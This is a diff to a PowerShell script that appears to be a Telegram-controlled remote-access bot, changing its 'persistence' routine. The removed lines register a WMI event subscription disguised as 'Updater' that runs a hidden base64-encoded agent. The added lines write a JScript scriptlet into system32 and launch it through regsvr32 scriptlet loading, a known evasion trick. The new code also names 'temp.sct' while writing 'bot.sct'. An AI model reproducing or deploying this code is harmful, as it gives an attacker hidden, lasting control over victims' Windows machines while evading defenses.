@@ -192,8 +192,26 @@ Remove-Item $ruta_ps1 ; sleep -Seconds 5 ; Remove-Item $ruta
 function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
-$agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot
-Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -win hidden -e $code";RunInteractively='false'};Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null
+$agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; $plantilla_sct = '<?XML version="1.0"?>
+<scriptlet>
+<registration
+description="Win32COMDebug"
+progid="Win32COMDebug"
+version="1.00"
+classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+ >
+ <script language="JScript">
+      <![CDATA[
+           var r = new ActiveXObject("WScript.Shell").Run("' + $CODE + '",0);
+      ]]>
+ </script>
+</registration>
+<public>
+    <method name="Exec"></method>
+</public>
+</scriptlet>'
+$plantilla_sct | Out-File -Encoding ascii -FilePath "c:\windows\system32\bot.sct"
+Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate="$($Env:SystemRoot)\System32\regsvr32.exe /s /n /u /i:c:\windows\system32\temp.sct scrobj.dll ";RunInteractively='false'};Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null
 $texto = "Persistencia ejecutada correctamente"; return $texto;break}
 }
 
